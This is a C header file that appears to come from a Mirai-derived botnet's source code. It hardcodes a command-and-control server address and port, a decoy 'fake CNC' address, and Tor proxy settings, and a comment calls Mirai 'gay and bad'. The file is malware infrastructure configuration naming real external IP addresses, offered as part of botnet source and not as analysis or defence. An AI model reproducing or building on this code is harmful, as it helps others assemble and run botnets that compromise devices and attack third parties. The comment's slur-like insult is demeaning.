#pragma once

#include <unistd.h>
#include <stdint.h>
#include <stdarg.h>

#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))
#define NONBLOCK(fd) (fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0)))
#define SINGLE_INSTANCE_PORT 58459

#define CNC_IP          INET_ADDR(146,19,191,205)
#define CNC_PORT        1337

#define FAKE_CNC_ADDR   INET_ADDR(65,222,202,53)
#define FAKE_CNC_PORT   5880

#define TOR_PROXY_IP    INET_ADDR(146,19,191,205)
#define TOR_PROXY_PORT  5880

#define STDIN   0
#define STDOUT  1
#define STDERR  2

#define FALSE   0
#define TRUE    1

typedef char BOOL;

typedef uint32_t ipv4_t;
typedef uint16_t port_t;

/* this is mirais fault, bc mirai is gay and bad and outdated */
extern ipv4_t LOCAL_ADDR;
